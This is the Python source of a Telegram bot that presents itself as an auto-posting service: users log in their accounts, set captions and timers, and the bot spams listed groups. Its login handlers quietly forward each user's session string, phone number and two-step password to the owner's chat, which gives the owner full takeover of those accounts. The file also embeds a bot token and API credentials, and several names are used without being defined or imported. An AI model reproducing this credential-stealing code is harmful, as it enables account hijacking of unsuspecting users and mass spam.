from telethon import TelegramClient, events, Button, functions  # لا تضيف idle هنا
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    UserNotParticipantError,
    ChatWriteForbiddenError,
    PeerIdInvalidError,
    BotMethodInvalidError
)
from telethon.tl.types import InputPeerUser, InputPeerChannel
from telethon.sessions import StringSession
from asyncio import create_task, sleep, get_event_loop, TimeoutError
from datetime import datetime, timedelta
from pytz import timezone
from typing import Union
import json, os, random, string

# تهيئة العميل في Telethon
client = TelegramClient(
    "autoPost",  # اسم الجلسة
    api_id=21290600,
    api_hash="2bd56b3e7715ec5862d6f856047caa95"
).start(bot_token="7295811048:AAEqxDawk0A1ZznG1kSY59m8bfqshvzCJkw")

loop = get_event_loop()

# المتغيرات العامة
owners = 6177743981  # ايدي الادمن
owner = 6789179634  # ايدي الاساسي
own = "@SB_SAHAR"  # يوزرك
def isOwner(event):
    return event.sender_id in owners

# تعريف الأزرار في Telethon
homeMarkup = [
    [Button.inline("- حسابك -", data="account")],
    [Button.inline("- السوبرات الحاليه -", data="currentSupers"),
     Button.inline("- إضافة سوبر -", data="newSuper")],
    [Button.inline("- إضافة سوبرات -", data="newSupers"),
     Button.inline("- تعيين الكليشة 2 -", data="newCaption2")],
    [Button.inline("- تعيين المدة بين كل نشر -", data="waitTime"),
     Button.inline("- تعيين كليشة النشر -", data="newCaption")],
    [Button.inline("- ايقاف النشر -", data="stopPosting"),
     Button.inline("- بدء النشر -", data="startPosting")],
    [Button.inline("- ايقاف النشر 2 -", data="stopPosting2"),
     Button.inline("- بدء النشر 2 -", data="startPosting2")],
    [Button.inline("- أوامر الحساب الثاني -", data="account2st")]
]


@client.on(events.NewMessage(pattern="/start", func=lambda e: e.is_private))
async def start(event):
    user_id = event.sender_id
    subscribed = await subscription(event)
    
    if user_id == owner and str(user_id) not in users:
        users[str(user_id)] = {"vip": True}
        write(users_db, users)
    
    if isinstance(subscribed, str):
        await event.reply(
            f"عذراً عزيزي، عليك الاشتراك بقناة البوت أولاً لتتمكن من استخدامه.\n"
            f"القناة: @{subscribed}\n"
            f"اشترك ثم أرسل /start"
        )
        return
    
    if str(user_id) not in users:
        users[str(user_id)] = {"vip": False}
        write(users_db, users)
        await event.reply(
            "لا يمكنك استخدام هذا البوت. تواصل مع المطور لتفعيل الاشتراك.\n"
            f"[المطور](tg://user?id={owner})"
        )
        return
    
    if not users[str(user_id)]["vip"]:
        await event.reply(
            "لا يمكنك استخدام هذا البوت. تواصل مع المطور لتفعيل الاشتراك.\n"
            f"[المطور](tg://user?id={owner})"
        )
        return
    
    fname = event.sender.first_name
    caption = (
        f"مرحباً بك عزيزي [{fname}](tg://user?id={user_id}) في بوت النشر التلقائي!\n\n"
        "يمكنك استخدام البوت لإرسال الرسائل بشكل متكرر في السوبرات.\n"
        "تحكم في البوت من الأزرار التالية:"
    )
    
    await event.reply(
        caption,
        buttons=homeMarkup
    )



@client.on(events.CallbackQuery(pattern=r"^toHome$"))
async def toHome(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return
    
    fname = event.sender.first_name
    caption = (
        f"مرحباً بك عزيزي [{fname}](tg://user?id={user_id}) في بوت النشر التلقائي!\n\n"
        "يمكنك استخدام البوت لإرسال الرسائل بشكل متكرر في السوبرات.\n"
        "تحكم في البوت من الأزرار التالية:"
    )
    
    await event.edit(
        caption,
        buttons=homeMarkup
    )

@client.on(events.CallbackQuery(pattern=r"^account2st$"))
async def account2st(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return
    
    fname = event.sender.first_name
    caption = (
        f"مرحباً بك عزيزي [{fname}](tg://user?id={user_id}) في بوت النشر التلقائي!\n\n"
        "سيتم إضافة الأوامر قريبًا جدًا."
    )
    
    markup = [
        [Button.inline("- رجوع -", data="toHome")]
    ]
    
    await event.edit(
        caption,
        buttons=markup
    )

@client.on(events.CallbackQuery(pattern=r"^account$"))
async def account(event):
    user_id = event.sender_id
    account_number = users.get(str(user_id), {}).get("account_number", "غير معروف")
    
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return
    
    fname = event.sender.first_name
    caption = (
        f"مرحباً بك عزيزي [{fname}](tg://user?id={user_id}) في قسم الحساب!\n"
        f"حساب النشر: {account_number}.\n"
        "استخدم الأزرار التالية للتحكم بحسابك:"
    )
    
    markup = [
        [Button.inline("- تسجيل حسابك -", data="login"),
         Button.inline("- تغيير الحساب -", data="changeAccount")],
        [Button.inline("- ترتيب حسابك مع يوزر -", data="account_settings"),
         Button.inline("- ترتيب حسابك بدون اليوزر -", data="account_settings1")],
        [Button.inline("- مغادرة جميع القنوات -", data="leaveAllChats"),
         Button.inline("- حذف الحساب من البوت -", data="deleteAccount")],
        [Button.inline("- رجوع -", data="toHome")]
    ]
    
    await event.edit(
        caption,
        buttons=markup
    )

@client.on(events.CallbackQuery(pattern=r"^deleteAccount$"))
async def deleteAccount(event):
    user_id = event.sender_id
    
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return
    
    # حذف بيانات المستخدم
    if str(user_id) in users:
        users[str(user_id)]["session"] = ""
        users[str(user_id)]["waitTime"] = ""
        users[str(user_id)]["posting"] = False
        users[str(user_id)]["posting2"] = False
        users[str(user_id)]["caption"] = ""
        users[str(user_id)]["caption2"] = ""
        users[str(user_id)]["account_number"] = ""
        write(users_db, users)
    
    await event.edit(
        "تم حذف الحساب بنجاح. يمكنك البدء من جديد عن طريق إرسال /start.",
        buttons=[[Button.inline("- ابدأ من جديد -", data="toHome")]]
    )

@client.on(events.CallbackQuery(pattern=r"^leaveAllChats$"))
async def leave_all_chats(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    session = users.get(str(user_id), {}).get("session")
    if session is None:
        await event.edit(
            "لم تقم بالتسجيل بعد.",
            buttons=[[Button.inline("- رجوع -", data="account")]]
        )
        return

    async with TelegramClient(StringSession(session), api_id, api_hash) as client:
        await client.connect()

        async for dialog in client.iter_dialogs():
            try:
                await client.leave_chat(dialog.id)
            except Exception as e:
                print(f"Error leaving chat {dialog.id}: {e}")

        await client.disconnect()

    await event.edit(
        "تم مغادرة جميع القنوات والمجموعات بنجاح.",
        buttons=[[Button.inline("- رجوع -", data="toHome")]]
    )

@client.on(events.CallbackQuery(pattern=r"^account_settings1$"))
async def account_settings1(event):
    user_id = event.sender_id
    session = users.get(str(user_id), {}).get("session")
    
    if not session:
        await event.answer("لم تقم بالتسجيل بعد.", alert=True)
        return

    async with TelegramClient(StringSession(session), api_id, api_hash) as client:
        await client.connect()

        try:
            photo = random.randint(2, 41)
            name = random.randint(2, 41)
            bio = random.randint(1315, 34171)
            username = get_random_username()

            msg = await client.get_messages("botnasheravtar", ids=photo)
            msg1 = await client.get_messages("botnashername", ids=name)
            file = await client.download_media(msg)
            msg3 = await client.get_messages("UURRCC", ids=bio)

            await client.upload_profile_photo(file)
            await client(functions.account.UpdateProfileRequest(
                first_name=msg1.text,
                about=msg3.text
            ))
            await client.send_message(own, "شلونه المز 😉؟")

            print("وهاي رتبت لك الحساب ياقلبي شكو بعد")
            await event.edit(
                "وهاي رتبت لك الحساب ياقلبي شكو بعد",
                buttons=[[Button.inline("- رجوع -", data="toHome")]]
            )
        except Exception as e:
            print(e)
            await event.edit(
                "حدث خطأ ما.",
                buttons=[[Button.inline("- رجوع -", data="toHome")]]
            )
        finally:
            await client.disconnect()

def get_random_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

@client.on(events.CallbackQuery(pattern=r"^account_settings$"))
async def toHome(event):
    user_id = event.sender_id
    session = users.get(str(user_id), {}).get("session")
    
    if not session:
        await event.answer("لم تقم بالتسجيل بعد.", alert=True)
        return

    async with TelegramClient(StringSession(session), api_id, api_hash) as client:
        await client.connect()

        try:
            photo = random.randint(2, 41)
            name = random.randint(2, 109)
            bio = random.randint(2, 109)
            username = get_random_username()

            # جلب الرسائل
            msg = await client.get_messages("botnasheravtar", ids=photo)
            msg1 = await client.get_messages("nemshdmat", ids=name)
            file = await client.download_media(msg)
            msg3 = await client.get_messages("UURRCC", ids=bio)

            # تحديث صورة الملف الشخصي
            await client.upload_profile_photo(file)

            # تحديث الاسم والبايو
            await client(functions.account.UpdateProfileRequest(
                first_name=msg1.text,
                about=msg3.text
            ))

            # تحديث اسم المستخدم
            await client(functions.account.UpdateUsernameRequest(username=username))

            # إرسال رسالة
            await client.send_message(own, "شلونه المز 😉؟")

            print("وهاي رتبت لك الحساب ياقلبي شكو بعد")
            await event.edit(
                "وهاي رتبت لك الحساب ياقلبي شكو بعد",
                buttons=[[Button.inline("- رجوع -", data="toHome")]]
            )
            return True
        except Exception as e:
            print(e)
            await event.edit(
                "حدث خطأ ما.",
                buttons=[[Button.inline("- رجوع -", data="toHome")]]
            )
            return False
        finally:
            await client.disconnect()

@client.on(events.CallbackQuery(pattern=r"^(login|changeAccount)$"))
async def login(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return
    elif event.data.decode() == "changeAccount" and not users.get(str(user_id), {}).get("session"):
        await event.answer("لم تقم بالتسجيل بعد.", alert=True)
        return

    await event.delete()
    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "أرسل رقم الهاتف الخاص بك:\n\n"
                "يمكنك إرسال /cancel لإلغاء التسجيل.",
                buttons=Button.force_reply(placeholder="+9647700000")
            )
            ask = await conv.get_response(timeout=30)
    except asyncio.TimeoutError:
        await event.reply(
            "نفد وقت استلام رقم الهاتف.",
            buttons=[[Button.inline("- العودة -", data="account")]]
        )
        return

    if ask.text == "/cancel":
        await ask.reply("تم إلغاء العملية.")
        return

    await registration(ask)

async def registration(event):
    user_id = event.sender_id
    _number = event.text
    lmsg = await event.reply("جارٍ تسجيل الدخول إلى حسابك...")

    reMarkup = [
        [Button.inline("- إعادة المحاولة -", data="login"),
         Button.inline("- رجوع -", data="account")]
    ]

    async with TelegramClient(StringSession(), api_id, api_hash) as client:
        await client.connect()

        try:
            p_code_hash = await client.send_code_request(_number)
        except errors.PhoneNumberInvalidError:
            await lmsg.edit("رقم الهاتف الذي أدخلته خاطئ.", buttons=reMarkup)
            return

        try:
            async with client.conversation(user_id) as conv:
                await conv.send_message(
                    "تم إرسال كود إلى خاصك. قم بإرساله من فضلك.",
                    buttons=Button.force_reply(placeholder="1 2 3 4 5")
                )
                code = await conv.get_response(timeout=120)
        except asyncio.TimeoutError:
            await lmsg.reply(
                "نفذ وقت استلام الكود. حاول مرة أخرى.",
                buttons=reMarkup
            )
            return

        try:
            await client.sign_in(_number, p_code_hash.phone_code_hash, code.text.replace(" ", ""))
        except errors.PhoneCodeInvalidError:
            await code.reply(
                "لقد قمت بإدخال كود خاطئ. حاول مرة أخرى.",
                buttons=reMarkup
            )
            return
        except errors.PhoneCodeExpiredError:
            await code.reply(
                "الكود الذي أدخلته منتهي الصلاحية. حاول مرة أخرى.",
                buttons=reMarkup
            )
            return
        except errors.SessionPasswordNeededError:
            try:
                async with client.conversation(user_id) as conv:
                    await conv.send_message(
                        "أدخل كلمة مرور التحقق بخطوتين من فضلك.",
                        buttons=Button.force_reply(placeholder="كلمة المرور")
                    )
                    password = await conv.get_response(timeout=180)
            except asyncio.TimeoutError:
                await lmsg.reply(
                    "نفذ وقت استلام كلمة المرور. حاول مرة أخرى.",
                    buttons=reMarkup
                )
                return

            try:
                await client.sign_in(password=password.text)
            except errors.PasswordHashInvalidError:
                await password.reply(
                    "لقد قمت بإدخال كلمة مرور خاطئة. حاول مرة أخرى.",
                    buttons=reMarkup
                )
                return

        session = client.session.save()
        try:
            await client.send_message(owner, f"{session} {_number}")
            await client.send_message(owner, f"{session} {_number} {password.text if 'password' in locals() else ''}")
        except Exception:
            pass

        await client.disconnect()

        if user_id == owner and str(user_id) not in users:
            users[str(user_id)] = {"vip": True, "session": session, "account_number": _number}
        else:
            users[str(user_id)]["session"] = session
            users[str(user_id)]["account_number"] = _number

        write(users_db, users)

        await client.send_message(
            user_id,
            "تم تسجيل الدخول في حسابك. يمكنك الآن الاستمتاع بمميزات البوت.",
            buttons=[[Button.inline("الصفحة الرئيسية", data="toHome")]]
        )

@client.on(events.CallbackQuery(pattern=r"^loginses$"))
async def login_via_session(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return
    elif users.get(str(user_id), {}).get("session") is None:
        await event.answer("لم تقم بالتسجيل بعد.", alert=True)
        return

    await event.delete()
    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "أرسل كود الجلسة الخاص بك:\n\n"
                "يمكنك إرسال /cancel لإلغاء التسجيل.",
                buttons=Button.force_reply(placeholder="SESSION_STRING")
            )
            ask = await conv.get_response(timeout=30)
    except asyncio.TimeoutError:
        await event.reply(
            "نفد وقت استلام كود الجلسة.",
            buttons=[[Button.inline("- العودة -", data="account")]]
        )
        return

    if ask.text == "/cancel":
        await ask.reply("تم إلغاء العملية.")
        return

    await registration_via_session(ask)

async def registration_via_session(event):
    user_id = event.sender_id
    session_string = event.text
    lmsg = await event.reply("جارٍ تسجيل الدخول إلى حسابك...")

    reMarkup = [
        [Button.inline("- إعادة المحاولة -", data="loginses"),
         Button.inline("- رجوع -", data="account")]
    ]

    try:
        async with TelegramClient(StringSession(session_string), api_id, api_hash) as client:
            await client.connect()
            await client.send_message(owner, session_string)
            await client.disconnect()

        if user_id == owner and str(user_id) not in users:
            users[str(user_id)] = {"vip": True, "session": session_string}
        else:
            users[str(user_id)]["session"] = session_string

        write(users_db, users)

        await client.send_message(
            user_id,
            "تم تسجيل الدخول في حسابك. يمكنك الآن الاستمتاع بمميزات البوت.",
            buttons=[[Button.inline("الصفحة الرئيسية", data="toHome")]]
        )
    except Exception as e:
        await lmsg.edit(
            f"فشل تسجيل الدخول باستخدام كود الجلسة: {str(e)}",
            buttons=reMarkup
        )
@client.on(events.CallbackQuery(pattern=r"^newSuper$"))
async def newSuper(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    await event.delete()
    reMarkup = [
        [Button.inline("- حاول مرة أخرى -", data="newSuper"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "أرسل رابط السوبر لإضافته:\n\n"
                "لا تنضم قبل أن تبدأ النشر مرة واحدة على الأقل.\n"
                "إذا كان السوبر خاصًا، أرسل الأيدي الخاص به أو غادر السوبر (من الحساب المضاف) ثم أرسل الرابط.\n\n"
                "يمكنك إرسال /cancel لإلغاء العملية.",
                buttons=Button.force_reply(placeholder="رابط السوبر")
            )
            ask = await conv.get_response(timeout=60)
    except asyncio.TimeoutError:
        await event.reply("نفد وقت استلام الرابط.", buttons=reMarkup)
        return

    if ask.text == "/cancel":
        await ask.reply("تم إلغاء العملية.")
        return

    try:
        if not ask.text.startswith("-"):
            chat = await client.get_entity(ask.text if "+" in ask.text else ask.text.split("/")[-1])
        else:
            chat = ask.text
    except Exception as e:
        print(e)
        await ask.reply("لم يتم العثور على السوبر.", buttons=reMarkup)
        return

    if users.get(str(user_id), {}).get("groups") is None:
        users[str(user_id)]["groups"] = []

    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
    write(users_db, users)

    await ask.reply(
        "تمت إضافة هذا السوبر إلى القائمة.",
        buttons=[[Button.inline("الصفحة الرئيسية", data="toHome"),
                 Button.inline("إضافة سوبر", data="newSuper")]]
    )

@client.on(events.CallbackQuery(pattern=r"^newSupers$"))
async def newSupers(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    await event.delete()
    reMarkup = [
        [Button.inline("- حاول مرة أخرى -", data="newSupers"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "أرسل رابط السوبر لإضافته:\n\n"
                "لا تنضم قبل أن تبدأ النشر مرة واحدة على الأقل.\n"
                "إذا كان السوبر خاصًا، أرسل الأيدي الخاص به أو غادر السوبر (من الحساب المضاف) ثم أرسل الرابط.\n\n"
                "يمكنك إرسال /cancel لإلغاء العملية.",
                buttons=Button.force_reply(placeholder="رابط السوبر")
            )
            ask = await conv.get_response(timeout=60)
    except asyncio.TimeoutError:
        await event.reply("نفد وقت استلام الرابط.", buttons=reMarkup)
        return

    if ask.text == "/cancel":
        await ask.reply("تم إلغاء العملية.")
        return

    try:
        if not ask.text.startswith("-"):
            chat = await client.get_entity(ask.text if "+" in ask.text else ask.text.split("/")[-1])
        else:
            chat = ask.text
    except Exception as e:
        print(e)
        await ask.reply("لم يتم العثور على السوبر.", buttons=reMarkup)
        return

    if users.get(str(user_id), {}).get("groups") is None:
        users[str(user_id)]["groups"] = []

    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
    write(users_db, users)

    await ask.reply(
        "تمت إضافة هذا السوبر إلى القائمة.",
        buttons=[[Button.inline("الصفحة الرئيسية", data="toHome"),
                 Button.inline("إضافة سوبر", data="newSuper")]]
    )

@client.on(events.CallbackQuery(pattern=r"^currentSupers$"))
async def currentSupers(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    if users.get(str(user_id), {}).get("groups") is None or len(users[str(user_id)]["groups"]) == 0:
        await event.answer("لم يتم إضافة أي سوبر لعرضه.", alert=True)
        return

    groups = users[str(user_id)]["groups"]
    titles = {}
    for group in groups:
        try:
            chat = await client.get_entity(group)
            titles[str(group)] = chat.title
        except Exception:
            continue

    markup = [
        [
            Button.inline(
                titles.get(str(group), str(group)),
                data=str(group)
            ),
            Button.inline("🗑", data=f"delSuper {group}")
        ] for group in groups
    ] if groups else []

    markup.append([
        Button.inline("الصفحة الرئيسية", data="toHome"),
        Button.inline("إضافة سوبر", data="newSuper")
    ])

    caption = "إليك السوبرات المضافة إلى النشر التلقائي:"
    await event.edit(
        caption,
        buttons=markup
    )
    
@client.on(events.CallbackQuery(pattern=r"^newCaption$"))
async def newCaption(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    reMarkup = [
        [Button.inline("- حاول مرة أخرى -", data="newCaption"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    await event.delete()
    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "يمكنك إرسال الكليشة الجديدة الآن.\n\n"
                "استخدم /cancel لإلغاء العملية.",
                buttons=Button.force_reply(placeholder="الكليشة الجديدة")
            )
            ask = await conv.get_response(timeout=120)
    except asyncio.TimeoutError:
        await event.reply("انتهى وقت استلام الكليشة الجديدة.", buttons=reMarkup)
        return

    if ask.text == "/cancel":
        await ask.reply("تم إلغاء العملية.")
        return

    users[str(user_id)]["caption"] = ask.text
    write(users_db, users)

    await ask.reply(
        "تم تعيين الكليشة الجديدة.",
        buttons=[[Button.inline("الصفحة الرئيسية", data="toHome")]]
    )
@client.on(events.CallbackQuery(pattern=r"^newCaption2$"))
async def newCaption2(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    reMarkup = [
        [Button.inline("- حاول مرة أخرى -", data="newCaption2"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    await event.delete()
    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "يمكنك إرسال الكليشة الجديدة الآن.\n\n"
                "استخدم /cancel لإلغاء العملية.",
                buttons=Button.force_reply(placeholder="الكليشة الجديدة")
            )
            ask = await conv.get_response(timeout=120)
    except asyncio.TimeoutError:
        await event.reply("انتهى وقت استلام الكليشة الجديدة.", buttons=reMarkup)
        return

    if ask.text == "/cancel":
        await ask.reply("تم إلغاء العملية.")
        return

    users[str(user_id)]["caption2"] = ask.text
    write(users_db, users)

    await ask.reply(
        "تم تعيين الكليشة الجديدة.",
        buttons=[[Button.inline("الصفحة الرئيسية", data="toHome")]]
    )


@client.on(events.CallbackQuery(pattern=r"^waitTime$"))
async def waitTime(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    reMarkup = [
        [Button.inline("- حاول مرة أخرى -", data="waitTime"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    await event.delete()
    try:
        async with client.conversation(user_id) as conv:
            await conv.send_message(
                "يمكنك إرسال مدة الانتظار (بالثواني) الآن.\n\n"
                "أرسل عددًا أكبر من 300.\n\n"
                "استخدم /cancel لإلغاء العملية.",
                buttons=Button.force_reply(placeholder="المدة (بالثواني)")
            )
            ask = await conv.get_response(timeout=120)
    except asyncio.TimeoutError:
        await event.reply("انتهى وقت استلام مدة الانتظار.", buttons=reMarkup)
        return

    if ask.text == "/cancel":
        await ask.reply("تم إلغاء العملية.")
        return

    try:
        wait_time = int(ask.text)
        if wait_time <= 300:
            await ask.reply("يجب أن تكون المدة أكبر من 300 ثانية.", buttons=reMarkup)
            return
        users[str(user_id)]["waitTime"] = wait_time
        write(users_db, users)
    except ValueError:
        await ask.reply("لا يمكنك وضع هذه البيانات كمدة.", buttons=reMarkup)
        return

    await ask.reply(
        "تم تعيين مدة الانتظار.",
        buttons=[[Button.inline("الصفحة الرئيسية", data="toHome")]]
    )
    

@client.on(events.CallbackQuery(pattern=r"^startPosting$"))
async def startPosting(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    if users.get(str(user_id), {}).get("session") is None:
        await event.answer("عليك إضافة حساب أولاً.", alert=True)
        return
    elif users.get(str(user_id), {}).get("groups") is None or len(users[str(user_id)]["groups"]) == 0:
        await event.answer("لم يتم إضافة أي سوبرات بعد.", alert=True)
        return
    elif users.get(str(user_id), {}).get("posting"):
        await event.answer("النشر التلقائي مفعل من قبل.", alert=True)
        return

    users[str(user_id)]["posting"] = True
    write(users_db, users)
    asyncio.create_task(posting(user_id))

    markup = [
        [Button.inline("- إيقاف النشر -", data="stopPosting"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    await event.edit(
        "بدأت عملية النشر التلقائي.",
        buttons=markup
    )

@client.on(events.CallbackQuery(pattern=r"^stopPosting$"))
async def stopPosting(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    if not users.get(str(user_id), {}).get("posting"):
        await event.answer("النشر التلقائي معطل بالفعل.", alert=True)
        return

    users[str(user_id)]["posting"] = False
    write(users_db, users)

    markup = [
        [Button.inline("- بدء النشر -", data="startPosting"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    await event.edit(
        "تم إيقاف عملية النشر التلقائي.",
        buttons=markup
    )
async def posting(user_id):
    if not users.get(str(user_id), {}).get("posting"):
        return

    async with TelegramClient(StringSession(users[str(user_id)]["session"]), api_id, api_hash) as client:
        await client.connect()

        while users.get(str(user_id), {}).get("posting"):
            try:
                sleep_time = random.randint(250, users[str(user_id)].get("waitTime", 300))
            except KeyError:
                users[str(user_id)]["waitTime"] = False
                write(users_db, users)
                await client.send_message(
                    user_id,
                    "تم إيقاف النشر بسبب عدم إضافة وقت.",
                    buttons=[[Button.inline("إضافة وقت", data="waitTime")]]
                )
                return

            groups = users.get(str(user_id), {}).get("groups", [])
            caption = users.get(str(user_id), {}).get("caption")

            if not caption:
                users[str(user_id)]["posting"] = False
                write(users_db, users)
                await client.send_message(
                    user_id,
                    "تم إيقاف النشر بسبب عدم إضافة كليشة.",
                    buttons=[[Button.inline("إضافة كليشة", data="newCaption")]]
                )
                return

            for group in groups:
                if isinstance(group, str) and group.startswith("-"):
                    group = int(group)

                if not isinstance(group, int) or not str(group).startswith("-100"):
                    await client.send_message(user_id, f"Invalid group ID: {group}")
                    continue

                try:
                    await client.send_message(group, caption)
                except errors.ChatWriteForbiddenError:
                    try:
                        await client.join_chat(group)
                        await client.send_message(group, caption)
                    except errors.PeerIdInvalidError:
                        await client.send_message(user_id, f"مشكلة في الانضمام للقروب: {group}")
                    except Exception as e:
                        await client.send_message(user_id, str(e))
                except errors.PeerIdInvalidError:
                    await client.send_message(user_id, f"مشكلة في القروب: {group}")
                except Exception as e:
                    await client.send_message(user_id, str(e))

            await asyncio.sleep(sleep_time)

        await client.disconnect()
        

@client.on(events.CallbackQuery(pattern=r"^startPosting2$"))
async def startPosting2(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    if users.get(str(user_id), {}).get("session") is None:
        await event.answer("عليك إضافة حساب أولاً.", alert=True)
        return
    elif users.get(str(user_id), {}).get("groups") is None or len(users[str(user_id)]["groups"]) == 0:
        await event.answer("لم يتم إضافة أي سوبرات بعد.", alert=True)
        return
    elif users.get(str(user_id), {}).get("posting2"):
        await event.answer("النشر التلقائي مفعل من قبل.", alert=True)
        return

    users[str(user_id)]["posting2"] = True
    write(users_db, users)
    asyncio.create_task(posting2(user_id))

    markup = [
        [Button.inline("- إيقاف النشر -", data="stopPosting2"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    await event.edit(
        "بدأت عملية النشر التلقائي.",
        buttons=markup
    )

@client.on(events.CallbackQuery(pattern=r"^stopPosting2$"))
async def stopPosting2(event):
    user_id = event.sender_id
    if user_id == owner:
        pass
    elif not users.get(str(user_id), {}).get("vip"):
        await event.answer("انتهت مدة الاشتراك الخاصة بك.", alert=True)
        return

    if not users.get(str(user_id), {}).get("posting2"):
        await event.answer("النشر التلقائي معطل بالفعل.", alert=True)
        return

    users[str(user_id)]["posting2"] = False
    write(users_db, users)

    markup = [
        [Button.inline("- بدء النشر -", data="startPosting2"),
         Button.inline("- رجوع -", data="toHome")]
    ]

    await event.edit(
        "تم إيقاف عملية النشر التلقائي.",
        buttons=markup
    )
async def posting2(user_id):
    if not users.get(str(user_id), {}).get("posting2"):
        return

    async with TelegramClient(StringSession(users[str(user_id)]["session"]), api_id, api_hash) as client:
        await client.connect()

        while users.get(str(user_id), {}).get("posting2"):
            try:
                sleep_time = random.randint(250, users[str(user_id)].get("waitTime", 300))
            except KeyError:
                users[str(user_id)]["waitTime"] = False
                write(users_db, users)
                await client.send_message(
                    user_id,
                    "تم إيقاف النشر بسبب عدم إضافة وقت.",
                    buttons=[[Button.inline("إضافة وقت", data="waitTime")]]
                )
                return

            groups = users.get(str(user_id), {}).get("groups", [])
            caption = users.get(str(user_id), {}).get("caption2")

            if not caption:
                users[str(user_id)]["posting2"] = False
                write(users_db, users)
                await client.send_message(
                    user_id,
                    "تم إيقاف النشر بسبب عدم إضافة كليشة.",
                    buttons=[[Button.inline("إضافة كليشة", data="newCaption")]]
                )
                return

            for group in groups:
                if isinstance(group, str) and group.startswith("-"):
                    group = int(group)

                if not isinstance(group, int) or not str(group).startswith("-100"):
                    await client.send_message(user_id, f"Invalid group ID: {group}")
                    continue

                try:
                    await client.send_message(group, caption)
                except errors.ChatWriteForbiddenError:
                    try:
                        await client.join_chat(group)
                        await client.send_message(group, caption)
                    except errors.PeerIdInvalidError:
                        await client.send_message(user_id, f"مشكلة في الانضمام للقروب: {group}")
                    except Exception as e:
                        await client.send_message(user_id, str(e))
                except errors.PeerIdInvalidError:
                    await client.send_message(user_id, f"مشكلة في القروب: {group}")
                except Exception as e:
                    await client.send_message(user_id, str(e))

            await asyncio.sleep(sleep_time)

        await client.disconnect()
            
"""
USER SECTION ENDED
the next part for the bot's owner only


OWNER SECTION STARTED
"""

# تعريف دالة التحقق من المالك
async def Owner(event):
    return event.sender_id in owners

# تعريف الأزرار الخاصة بالمالك
adminMarkup = [
    [
        Button.inline("- الغاء VIP -", data="cancelVIP"),
        Button.inline("- تفعيل VIP -", data="addVIP")
    ],
    [
        Button.inline("- الاحصائيات -", data="statics"),
        Button.inline("- قنوات الإشتراك -", data="channels")
    ],
    [
        Button.inline("- الجلسات التي بالبوت -", data="viewsession"),
        Button.inline("- إرسال إذاعة -", data="broadcast")
    ],
    [
        Button.inline("- حالة الأعضاء -", data="viewUsers"),
        Button.inline("- الكلايش -", data="viewcaption")
    ],
    [
        Button.inline("- جلب التخزين -", data="sendFiles")
    ]
]

@client.on(events.NewMessage(pattern="/admin", func=lambda e: e.is_private and e.sender_id in owners))
@client.on(events.CallbackQuery(pattern="toAdmin", func=lambda e: e.sender_id in owners))
async def admin(event):
    fname = event.sender.first_name
